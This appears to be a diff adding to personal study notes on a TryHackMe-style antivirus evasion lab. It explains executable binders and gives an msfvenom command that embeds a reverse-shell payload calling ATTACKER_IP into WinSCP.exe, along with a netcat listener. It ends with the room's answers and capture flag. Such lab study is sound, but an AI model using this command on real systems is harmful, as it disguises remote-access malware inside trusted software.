@@ -324,3 +324,21 @@ open confuserEx
 -get reverse shell
 nc -lvp 7478
 
+-------------------------------------------------------------------------------------------------------------------------------------
+
+-Binder: program that merges two or more executables into a single one.
+-used to distribute payload hidden inside another known program
+-Binding with msfvenom
+C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
+-Attack Box: nc -lvp 7779
+-Binders and AV: triggers AV without encoders, crypters, or packers 
+
+-----------------------------------------------------------------------------------------------------------------------
+
+Which AV software is running on the VM?
+-Windows Defender
+What is the name of the user account to which you have access?
+-av-victim
+Establish a working shell on the vicitm machine and read the file on the user's Desktop. What is the flag?
+-THM{H3ll0-W1nD0ws-Def3nd3r!}
+
